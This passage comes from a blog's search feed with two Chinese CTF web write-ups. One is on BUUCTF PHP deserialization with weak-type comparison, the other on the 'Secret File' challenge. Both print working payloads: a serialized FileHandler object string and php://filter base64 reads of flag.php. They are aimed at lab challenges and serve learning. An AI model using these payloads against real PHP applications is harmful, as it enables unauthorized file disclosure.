class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = <span class="built_in">file_get_contents</span>($<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">ord</span>($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; <span class="built_in">ord</span>($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">is_valid</span>($str)) &#123;</span><br><span class="line">        $obj = <span class="built_in">unserialize</span>($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂看不懂看不懂…直接看大佬总结出来的知识</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>PHP反序列化漏洞、弱类型比较。</p><p>经过分析，这个题目需要传入一个序列化之后的类对象，并且要绕过两层防护：</p><h2 id="两个防护："><a href="#两个防护：" class="headerlink" title="两个防护："></a>两个防护：</h2><h4 id="一：is-valid"><a href="#一：is-valid" class="headerlink" title="一：is_valid()"></a>一：is_valid()</h4><p>要求传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p><p><strong>绕过方法</strong>：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</p><h4 id="二：destruct-魔术方法"><a href="#二：destruct-魔术方法" class="headerlink" title="二：destruct()魔术方法"></a>二：destruct()魔术方法</h4><p>op===”2”，是强比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而在process()函数中,op==”2”是弱比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>绕过方法</strong>：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$op=<span class="number">2</span>;</span><br><span class="line">$oop=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($op===<span class="string">&quot;2&quot;</span>)</span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较失败&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($op==<span class="string">&quot;2&quot;</span>)</span><br><span class="line"> echo <span class="string">&quot;数字2与字符2弱比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2弱比较失败&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="本地进行序列化操作（？？？不懂啊）"><a href="#本地进行序列化操作（？？？不懂啊）" class="headerlink" title="本地进行序列化操作（？？？不懂啊）"></a>本地进行序列化操作（？？？不懂啊）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span>  $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;1&quot;</span>;        <span class="comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>序列化结果：（期间经历了什么咱也不知道）</strong></p><blockquote><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p><strong>payload：</strong></p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p>f12查看源码，找到flag<br><img src="https://img-blog.csdnimg.cn/20210518175816476.png" alt="在这里插入图片描述"></p><h4 id="也可以使用伪协议"><a href="#也可以使用伪协议" class="headerlink" title="也可以使用伪协议"></a>也可以使用伪协议</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;N;}</p></blockquote><p>得到一串base编码<br><img src="https://img-blog.csdnimg.cn/20210518180203370.png" alt="在这里插入图片描述">解码得到flag<br><img src="https://img-blog.csdnimg.cn/20210518180408894.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>PHP反序列化漏洞和弱类型比较还没掌握<br>路漫漫，加油学吧</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF[极客大挑战2019]Secret File</title>
      <link href="/2021/11/11/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/"/>
      <url>/2021/11/11/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/</url>
      
        <content type="html"><![CDATA[<p>朋友们好啊我是混元形意太极门掌门人马保国<br>刚才有个朋友发给我一个链接，我一看！嗷！原来是CTF题啊！他非要让我解解，我说可以。<br>诶…我啪的一下就进入了这个链接<br><img src="https://img-blog.csdnimg.cn/20201214221541596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>虽然我不想知道她的秘密啊…但是还是要不情愿的打开源页面查看源代码， 发现其中存在隐藏链接啊</p><p><img src="https://img-blog.csdnimg.cn/20201214221736450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…接着不情愿的点击这个隐藏链接跳转页面<br><img src="https://img-blog.csdnimg.cn/2020121422193574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>嗷！再次不情愿的点击SECRET<br><img src="https://img-blog.csdnimg.cn/20201214222023826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>哈！不讲武德…没看清！？ 那就怪不得我马某人掏出burp抓包了！<br><img src="https://img-blog.csdnimg.cn/20201214223443846.png#pic_center" alt="在这里插入图片描述"><br>接着我以GET方式进入 action.php 得到一个秘密文件 secr3t.php<br>哼！年轻人！<br><img src="https://img-blog.csdnimg.cn/20201214222811694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我笑了一下进入这个秘密文件后出现以下界面啊<br><img src="https://img-blog.csdnimg.cn/20201214223835338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们试着以GET方式传入变量file，值为flag.php<br>啊…哈！骗！偷袭！很快嗷！发现看不到flag……<br><img src="https://img-blog.csdnimg.cn/20201214224246562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…百度搜索PHP伪协议慢慢看一会儿…了解到这里应该需要结合php://filter协议流读取目标文件内容啊<br>嗷！就是在secr3t.php后面添加<br>？file=php://filter/read=convert.base64-encode/resource=flag.php<br>然后进行访问得到一串代码嗷<br><img src="https://img-blog.csdnimg.cn/20201214225106373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看出这里需要用到base64解码啊！<br>我一个闪电五连鞭!<br>解码成功得到flag!<br><img src="https://img-blog.csdnimg.cn/20201214225312155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶传统武术点到为止，他已经输了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
